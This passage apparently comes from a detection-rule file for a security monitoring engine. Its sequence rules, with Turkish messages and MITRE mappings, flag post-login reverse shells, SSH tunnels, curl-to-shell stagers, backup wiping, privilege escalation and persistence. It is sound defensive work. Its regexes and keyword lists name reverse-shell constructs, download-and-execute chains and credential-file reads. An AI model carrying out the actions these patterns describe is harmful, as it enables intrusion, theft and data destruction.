            "score":   89,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["ssh-copy-id ", "ssh-keygen ", ".ssh/config", ".ssh/known_hosts", "known_hosts", "/etc/hosts"]},
                                    {"command_regex": r'(?:echo|printf|tee|cat|cp|mv|sed|awk|perl|python3?)\s+.*(?:\.ssh/config|\.ssh/known_hosts|/etc/hosts)'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["git clone ", "git pull ", "git fetch ", "ssh-keygen -A", "ssh-keygen -R ", "ssh-keygen -F ", "ssh-keygen -l ", "github.com", "git@github.com", "unattended-upgrades", "needrestart", "cloud-init", "subscription-manager", "SUSEConnect", "transactional-update", "ansible-playbook ", "chef-client", "puppet ", "salt-call ", "salt-minion ", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "backup", "restore"]},
                                        {"command_token_contains_any": ["git", "backup", "restore"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["ssh", "scp", "sftp", "rsync"]},
                                            {"command_regex": r'(?:^|\s)(?:ssh|scp|sftp|rsync)\b.*(?:@)?(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})(?::\d+)?(?:\b|:)'},
                                            {
                                                "__any__": [
                                                    {"command_contains_any": ["ssh -J ", "ProxyJump=", "ProxyCommand=", "StrictHostKeyChecking=no", "UserKnownHostsFile=/dev/null", "ControlMaster=", "ControlPath=", "/tmp/", "/var/tmp/", "/dev/shm/"]},
                                                    {"command_regex": r'(?:^|\s)ssh\b.*(?:-J\s+|-L\s+\d| -R\s+\d| -D\s+\d|ProxyJump=|ProxyCommand=|StrictHostKeyChecking=no|UserKnownHostsFile=/dev/null)'},
                                                ]
                                            },
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["ansible", "ansible-playbook"]},
                                            {"command_contains_any": [" -m shell ", " -m command ", " -m raw ", " -m script ", " -m copy ", " -m synchronize ", " -a "]},
                                            {"__not__": {"command_contains_any": ["maintenance", "deploy", "rollout", "backup", "restore", "/health", "/healthz", "/readyz", "/livez"]}},
                                        ]
                                    },
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["git clone ", "git pull ", "git fetch ", ".deb", ".udeb", ".ddeb", ".rpm", ".repo", "/Packages.gz", "/Packages.xz", "/Release", "/InRelease", "/repodata/", "/suse/setup/descr", "/srv/repo/", "/srv/www/repo/", "/var/cache/apt/archives/", "/var/cache/dnf/", "/var/cache/zypp/", "github.com", "git@github.com", "ansible-playbook maintenance", "ansible-playbook deploy", "chef-client", "puppet ", "salt-call ", "salt-minion ", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "rsnapshot", "borg", "restic", "duplicity", "timeshift", "aws s3 sync", "backup@", "/etc/ansible/", "/srv/ansible/", "/srv/salt/", "/etc/puppetlabs/", "/var/lib/puppet/"]},
                                        {"command_token_contains_any": ["backup", "restore"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim sonrası SSH prep ve iç hedefe remote access/file push görüldü",
            "summary": "Login başarısını kısa sürede SSH trust/known_hosts/hosts hazırlığı ve ardından iç hedefe erişim veya dosya itme izledi.",
            "operator_note": "Hazırlık komutunun meşru config-management işi olup olmadığını, hedef iç IP'yi ve taşınan payload veya pivot parametrelerini doğrulayın.",
            "mitre_tactic": "TA0008",
            "mitre_technique": "T1021.004",
            "tags": ["sequence", "lateral-movement", "ssh", "pivot-prep", "remote-access", "file-push"],
        },
        {
            "id":      "SEQ-061",
            "name":    "Login Success → Tunnel or Reverse Shell",
            "severity": "critical",
            "score":   94,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["/dev/tcp/", "mkfifo ", "pty.spawn", "socket.socket(", "IO::Socket", "TCPSocket", "fsockopen(", "passthru(", "shell_exec(", "proc_open("]},
                                    {"command_regex": r'(?:^|\s)(?:nc|netcat|ncat)\b.*(?:-(?:e|c)\s*(?:/bin/)?(?:bash|sh|dash)|-(?:e|c)\s+/bin)'},
                                    {"command_regex": r'mkfifo\s+\S+\s*(?:;|\|\|?|\&\&)\s*(?:cat\s+\S+\s*\|)?\s*(?:nc|ncat|bash|sh|python|python3|perl)'},
                                    {"command_regex": r'python[23]?\s+-c\s+["\x27]?.*(?:socket\s*\.\s*socket|pty\.spawn|subprocess\.call)'},
                                    {"command_regex": r'perl\s+-e\s+["\x27]?.*(?:IO::Socket|exec\s*/bin/(?:bash|sh))'},
                                    {"command_regex": r'ruby\s+-rsocket\s+-e|ruby\s+-e\s+["\x27]?.*TCPSocket'},
                                    {"command_regex": r'php\s+-r\s+["\x27]?.*(?:fsockopen|popen|exec|system|passthru|shell_exec|proc_open)'},
                                    {"command_regex": r'socat\s+.*(?:EXEC:|SYSTEM:|TCP(?:4)?(?:-LISTEN|-CONNECT)?|OPENSSL:).*(?:/bin/(?:bash|sh)|pty)'},
                                    {
                                        "__all__": [
                                            {"command_token_contains": "ssh"},
                                            {
                                                "__any__": [
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-D\s+\d+'},
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-R\s+(?:0\.0\.0\.0:)?\d+:\S+'},
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-L\s+0\.0\.0\.0:\d+:\S+'},
                                                    {"command_contains_any": ["GatewayPorts=yes", "UserKnownHostsFile=/dev/null", "StrictHostKeyChecking=no", "ProxyCommand=", "PermitLocalCommand", " -Nf "]},
                                                ]
                                            },
                                        ]
                                    },
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["localhost:", "127.0.0.1:", "::1:", "kubectl port-forward", "docker run -p ", "docker compose port", "ssh -L 5432:127.0.0.1:5432", "ssh -L 3306:127.0.0.1:3306", "ssh -L 8080:127.0.0.1:8080", "ssh -L 8443:127.0.0.1:8443", "/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından tunnel veya reverse shell davranışı görüldü",
            "summary": "Login başarısını kısa sürede reverse shell launcher veya şüpheli SSH tunnel/port-forward komutu izledi.",
            "operator_note": "Komutun meşru admin/debug işi olup olmadığını, forward edilen portu ve uzak hedefi doğrulayın.",
            "mitre_tactic": "TA0011",
            "mitre_technique": "T1572",
            "tags": ["sequence", "post-auth", "tunnel", "reverse-shell", "covert-channel", "command-and-control"],
        },
        {
            "id":      "SEQ-062",
            "name":    "Web or Container Abuse → Tunnel or Reverse Shell",
            "severity": "critical",
            "score":   95,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["shell_upload", "path_traversal", "sqli_attempt", "http_request", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {
                                "__all__": [
                                    {
                                        "__any__": [
                                            {"attack_contains_any": ["shell_upload", "path_traversal", "sql_injection"]},
                                            {"path_decoded_lc_contains_any": ["cmd=", "exec=", "command=", "/bin/sh", "/bin/bash", "../", "/etc/passwd", ".php.jpg", ".phtml", ".jsp"]},
                                            {"path_lc_contains_any": ["%24%28id%29", "%60id%60", "%252e%252e%252f", ".php%00", ".php.jpg", ".phtml", ".jsp"]},
                                        ]
                                    },
                                    {
                                        "__not__": {
                                            "__any__": [
                                                {"path_decoded_lc_contains_any": ["/admin/upload", "/admin/media", "/wp-admin/", "/server-status", "/server-info", "/health", "/healthz", "/readyz", "/livez", "/status"]},
                                                {"ua_lc_contains_any": ["kube-probe", "prometheus", "elb-healthchecker"]},
                                            ]
                                        }
                                    },
                                ]
                            },
                            {
                                "__all__": [
                                    {"command_contains_any": ["docker exec ", "podman exec ", "kubectl exec ", "docker run --privileged", "podman run --privileged", "-v /:/host", "--mount type=bind,src=/,dst=/host", "/host/etc/", "/var/lib/kubelet/", "hostPath"]},
                                    {"__not__": {"command_contains_any": ["kubectl exec -n kube-system", "kubectl exec --namespace kube-system", "kubectl exec metrics-server", "kubectl logs ", "docker inspect ", "podman inspect ", "docker ps ", "podman ps ", "/health", "/healthz", "/readyz", "/livez", "-- /bin/true", "-- printenv"]}},
                                ]
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["/dev/tcp/", "mkfifo ", "pty.spawn", "socket.socket(", "IO::Socket", "TCPSocket", "fsockopen(", "passthru(", "shell_exec(", "proc_open("]},
                                    {"command_regex": r'(?:^|\s)(?:nc|netcat|ncat)\b.*(?:-(?:e|c)\s*(?:/bin/)?(?:bash|sh|dash)|-(?:e|c)\s+/bin)'},
                                    {"command_regex": r'socat\s+.*(?:EXEC:|SYSTEM:|TCP(?:4)?(?:-LISTEN|-CONNECT)?|OPENSSL:).*(?:/bin/(?:bash|sh)|pty)'},
                                    {
                                        "__all__": [
                                            {"command_token_contains": "ssh"},
                                            {
                                                "__any__": [
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-D\s+\d+'},
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-R\s+(?:0\.0\.0\.0:)?\d+:\S+'},
                                                    {"command_regex": r'(?:^|\s)ssh\b.*\s-L\s+0\.0\.0\.0:\d+:\S+'},
                                                    {"command_contains_any": ["GatewayPorts=yes", "UserKnownHostsFile=/dev/null", "StrictHostKeyChecking=no", "ProxyCommand=", "PermitLocalCommand", " -Nf "]},
                                                ]
                                            },
                                        ]
                                    },
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["localhost:", "127.0.0.1:", "::1:", "kubectl port-forward", "docker run -p ", "docker compose port", "/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Web veya container abuse sonrasında tunnel/reverse shell görüldü",
            "summary": "Şüpheli web exploitation ya da container abuse davranışını kısa sürede tunnel veya reverse shell launcher komutu izledi.",
            "operator_note": "İlk istismar bağlamını, dinleyen/bağlanan portu ve bunun meşru debug/ops işinden ayrıştığını doğrulayın.",
            "mitre_tactic": "TA0011",
            "mitre_technique": "T1572",
            "tags": ["sequence", "web", "container", "tunnel", "reverse-shell", "covert-channel", "post-exploitation"],
        },
        {
            "id":      "SEQ-063",
            "name":    "Access Success → Download → Execute",
            "severity": "critical",
            "score":   92,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:curl|wget)\s+[^\n;]*(?:-o|--output|-(?:q)?O| -O )\s*(?:/tmp/|/var/tmp/|/dev/shm/)\S+'},
                                    {"command_regex": r'(?:python[23]?|perl)\s+-c\s+["\x27]?.*(?:urllib\.request|requests\.get|urlopen|LWP::Simple|HTTP::Tiny).*(?:/tmp/|/var/tmp/|/dev/shm/)'},
                                    {"command_regex": r'(?:curl|wget)\s+[^\n|;]*\|\s*(?:bash|sh|dash|python[23]?|perl|ruby|php)\b'},
                                    {"command_regex": r'bash\s+-c\s+["\x27]?\$\((?:curl|wget)\s+'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "dnf ", "yum ", "rpm ", "zypper ", "packagekit", "git clone ", "git pull ", "git fetch ", ".deb", ".udeb", ".ddeb", ".rpm", ".repo", "/Packages.gz", "/Packages.xz", "/Release", "/InRelease", "/repodata/repomd.xml", "/repodata/primary.xml", "/repodata/filelists.xml", "/suse/setup/descr", "/content", "bootstrap", "repo", "/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["bootstrap", "debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:chmod\s+\+x\s+(?:/tmp/|/var/tmp/|/dev/shm/)\S+.*(?:&&|;)\s*(?:/tmp/|/var/tmp/|/dev/shm/)\S+)'},
                                    {"command_regex": r'(?:^|\s)(?:/tmp/|/var/tmp/|/dev/shm/)\S+'},
                                    {"command_contains_any": ["bash /tmp/", "sh /tmp/", "python /tmp/", "python3 /tmp/", "perl /tmp/", "php /tmp/", "bash /var/tmp/", "sh /var/tmp/", "python3 /var/tmp/", "bash /dev/shm/", "sh /dev/shm/"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["bootstrap", "debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından payload indirildi ve çalıştırıldı",
            "summary": "Login başarısını kısa sürede temp-path downloader/stager ve ardından execute adımı izledi.",
            "operator_note": "İndirilen yolun temp altında olup olmadığını, URL kaynağını ve takip eden yürütmenin meşru bootstrap/debug işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0002",
            "mitre_technique": "T1105",
            "tags": ["sequence", "downloader", "stager", "post-auth", "temp-path", "execute"],
        },
        {
            "id":      "SEQ-064",
            "name":    "Web or Container Abuse → Download → Execute",
            "severity": "critical",
            "score":   94,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["shell_upload", "path_traversal", "sqli_attempt", "http_request", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {
                                "__all__": [
                                    {
                                        "__any__": [
                                            {"attack_contains_any": ["shell_upload", "path_traversal", "sql_injection"]},
                                            {"path_decoded_lc_contains_any": ["cmd=", "exec=", "command=", "/bin/sh", "/bin/bash", "../", "/etc/passwd", ".php.jpg", ".phtml", ".jsp"]},
                                            {"path_lc_contains_any": ["%24%28id%29", "%60id%60", "%252e%252e%252f", ".php%00", ".php.jpg", ".phtml", ".jsp"]},
                                        ]
                                    },
                                    {
                                        "__not__": {
                                            "__any__": [
                                                {"path_decoded_lc_contains_any": ["/admin/upload", "/admin/media", "/wp-admin/", "/server-status", "/server-info", "/health", "/healthz", "/readyz", "/livez", "/status"]},
                                                {"ua_lc_contains_any": ["kube-probe", "prometheus", "elb-healthchecker"]},
                                            ]
                                        }
                                    },
                                ]
                            },
                            {
                                "__all__": [
                                    {"command_contains_any": ["docker exec ", "podman exec ", "kubectl exec ", "docker run --privileged", "podman run --privileged", "-v /:/host", "--mount type=bind,src=/,dst=/host", "/host/etc/", "/var/lib/kubelet/", "hostPath"]},
                                    {"__not__": {"command_contains_any": ["kubectl exec -n kube-system", "kubectl exec --namespace kube-system", "kubectl exec metrics-server", "kubectl logs ", "docker inspect ", "podman inspect ", "docker ps ", "podman ps ", "/health", "/healthz", "/readyz", "/livez", "-- /bin/true", "-- printenv"]}},
                                ]
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:curl|wget)\s+[^\n;]*(?:-o|--output|-(?:q)?O| -O )\s*(?:/tmp/|/var/tmp/|/dev/shm/)\S+'},
                                    {"command_regex": r'(?:python[23]?|perl)\s+-c\s+["\x27]?.*(?:urllib\.request|requests\.get|urlopen|LWP::Simple|HTTP::Tiny).*(?:/tmp/|/var/tmp/|/dev/shm/)'},
                                    {"command_regex": r'(?:curl|wget)\s+[^\n|;]*\|\s*(?:bash|sh|dash|python[23]?|perl|ruby|php)\b'},
                                    {"command_regex": r'bash\s+-c\s+["\x27]?\$\((?:curl|wget)\s+'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["git clone ", "git pull ", "git fetch ", ".deb", ".udeb", ".ddeb", ".rpm", ".repo", "/Packages.gz", "/Packages.xz", "/Release", "/InRelease", "/repodata/repomd.xml", "/repodata/primary.xml", "/repodata/filelists.xml", "/suse/setup/descr", "/content", "bootstrap", "repo", "/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["bootstrap", "debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:chmod\s+\+x\s+(?:/tmp/|/var/tmp/|/dev/shm/)\S+.*(?:&&|;)\s*(?:/tmp/|/var/tmp/|/dev/shm/)\S+)'},
                                    {"command_regex": r'(?:^|\s)(?:/tmp/|/var/tmp/|/dev/shm/)\S+'},
                                    {"command_contains_any": ["bash /tmp/", "sh /tmp/", "python /tmp/", "python3 /tmp/", "perl /tmp/", "php /tmp/", "bash /var/tmp/", "sh /var/tmp/", "python3 /var/tmp/", "bash /dev/shm/", "sh /dev/shm/"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                        {"command_token_contains_any": ["bootstrap", "debug", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Web veya container abuse sonrasında payload indirildi ve çalıştırıldı",
            "summary": "Şüpheli web exploitation ya da container abuse davranışını temp-path downloader/stager ve execute adımı izledi.",
            "operator_note": "İstismar bağlamını, URL kaynağını ve temp-path executable’ın gerçek uygulama/ops işinden ayrıştığını doğrulayın.",
            "mitre_tactic": "TA0002",
            "mitre_technique": "T1105",
            "tags": ["sequence", "web", "container", "downloader", "stager", "post-exploitation", "execute"],
        },
        {
            "id":      "SEQ-065",
            "name":    "Access Success → Destructive Action",
            "severity": "critical",
            "score":   95,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:^|\s)rm\s+-rf?\s+(?:/home/|/var/www/|/srv/|/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/|/var/lib/(?:restic|borg|snapper|rsnapshot)/)\S*'},
                                    {"command_regex": r'find\s+.*(?:/home/|/var/www/|/srv/|/var/backups/?|/srv/backup/?|/backup/?|/backups/?|/snapshots?/|/\.snapshots?/)\S*\s+.*-delete'},
                                    {"command_regex": r'(?:shred|wipe|srm|dd\s+if=/dev/(?:zero|null|urandom))\s+.*(?:/home/|/var/www/|/srv/|/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/)'},
                                    {"command_regex": r'(?:^|\s)chattr\s+[+-]i\s+.*(?:/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/|/var/lib/(?:restic|borg|snapper|rsnapshot)/|\.snapshot)'},
                                    {"command_regex": r'(?:^|\s)btrfs\s+sub(?:volume|vol)\s+delete\s+/\.snapshots?/\S+'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["rm -rf /tmp/", "rm -rf /var/tmp/", "rm -rf /dev/shm/", "find /tmp", "find /var/tmp", "find /dev/shm", "tmpreaper", "tmpwatch", "systemd-tmpfiles", "apt clean", "apt-get clean", "apt autoremove", "apt-get autoremove", "dnf clean", "yum clean", "zypper clean", "snapper cleanup", "transactional-update cleanup", "packagekit", "logrotate", "journalctl --vacuum", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion ", "maintenance", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["cleanup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından destructive delete/wipe davranışı görüldü",
            "summary": "Login başarısını kısa sürede yüksek değerli dizinlerde silme, wipe veya anti-recovery davranışı izledi.",
            "operator_note": "Hedef yolun gerçekten production veri/backup olup olmadığını ve komutun planlı maintenance işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0005",
            "mitre_technique": "T1070.004",
            "tags": ["sequence", "impact", "destructive", "anti-recovery", "post-auth"],
        },
        {
            "id":      "SEQ-067",
            "name":    "Login Success → Discovery → PrivEsc → Secret or Persistence",
            "severity": "critical",
            "score":   95,
            "timeout": 720,
            "entity_type": "host",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["sudo -l", "sudo --list", "doas -L", "getent group sudo", "getent group wheel", "getent group admin", "grep sudo /etc/group", "grep wheel /etc/group", "cat /etc/sudoers", "cat /etc/sudoers.d", "ls /etc/sudoers.d", "cat /etc/doas.conf"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "cloud-init"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "su", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_target_user": "root"},
                                    {"su_target": "root"},
                                    {"sudo_command_contains_any": ["sudo su", "sudo su -", "sudo -i", "pkexec", "doas ", "doas -s", "doas su -", "passwd root", "chpasswd", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d", "usermod -aG sudo", "usermod -aG wheel", "gpasswd -a"]},
                                    {"command_contains_any": ["sudo su", "sudo su -", "sudo -i", "su -", "pkexec", "/usr/bin/pkexec", "doas ", "doas -s", "doas su -", "doas /bin/sh", "doas /bin/bash", "passwd root", "chpasswd", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d"]},
                                    {"command_regex": r'(?:^|\s)(?:usermod\s+(?:-[^\n;]*\s+)*-aG\s+(?:sudo|wheel|adm|admin)\b|gpasswd\s+-a\s+\S+\s+(?:sudo|wheel|adm|admin)\b)'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit"]},
                                        {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec", "service_created", "passwd_change", "useradd"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": [".env", ".pgpass", ".my.cnf", ".aws/credentials", ".kube/config", "/run/secrets/", "/var/run/secrets/", "/etc/secrets/"]},
                                    {"command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/sudoers", "/etc/sudoers.d", "/etc/ssh/sshd_config", "/etc/profile", "/etc/profile.d"]},
                                    {"sudo_command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/etc/systemd/system", "/etc/sudoers", "/etc/sudoers.d", "/etc/ssh/sshd_config", "/etc/profile", "/etc/profile.d"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload"]},
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "unattended-upgrades", "cloud-init", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Discovery sonrası yetki yükseltme ve ardından secret/persistence davranışı görüldü",
            "summary": "Başarılı erişim sonrası sudo/doas/sudoers/admin-group keşfi, bunu izleyen yetki yükseltme ve hemen ardından secret erişimi veya persistence değişikliği görüldü.",
            "operator_note": "Discovery komutunu, privesc aracını ve takip eden secret/persistence adımının planlı admin işi olup olmadığını birlikte doğrulayın.",
            "mitre_tactic": "TA0004",
            "mitre_technique": "T1548.003",
            "tags": ["sequence", "post-auth", "discovery", "privilege-escalation", "credential-access", "persistence", "sudo", "doas", "pkexec"],
        },
        {
            "id":      "SEQ-068",
            "name":    "Login Or PrivEsc → Account Manipulation → Persistence or Remote Access",
            "severity": "critical",
            "score":   93,
            "timeout": 900,
            "entity_type": "host",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login", "sudo", "su"], "outcome": "success"},
                {
                    "action": ["sudo", "useradd", "exec", "process_exec", "lotl_exec", "passwd_change"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["useradd ", "adduser ", "groupadd ", "groupmod ", "usermod -aG sudo", "usermod -aG wheel", "usermod -aG adm", "usermod -aG admin", "usermod -L", "usermod -U", "usermod -s", "usermod -d", "chsh ", "gpasswd -a", "gpasswd -d", "passwd -l", "passwd -u", "passwd root", "chpasswd", "authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/security/access.conf", "/etc/pam.d/", "/etc/sssd/sssd.conf", "/etc/login.defs", "/etc/default/useradd"]},
                                    {"command_contains_any": ["useradd ", "adduser ", "groupadd ", "groupmod ", "usermod -aG sudo", "usermod -aG wheel", "usermod -aG adm", "usermod -aG admin", "usermod -L", "usermod -U", "usermod -s", "usermod -d", "chsh ", "gpasswd -a", "gpasswd -d", "passwd -l", "passwd -u", "passwd root", "chpasswd", "authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/security/access.conf", "/etc/pam.d/", "/etc/sssd/sssd.conf", "/etc/login.defs", "/etc/default/useradd"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemd-sysusers", "--system", "/usr/sbin/nologin", "/bin/false", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit"]},
                                        {"command_contains_any": ["needrestart", "unattended-upgrades", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemd-sysusers", "--system", "/usr/sbin/nologin", "/bin/false", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["ssh_login", "sudo", "exec", "process_exec", "lotl_exec", "service_created"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["authorized_keys", ".ssh/authorized_keys", "/etc/ssh/sshd_config", "PermitRootLogin", "PasswordAuthentication", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/cron", "/etc/crontab", "/var/spool/cron"]},
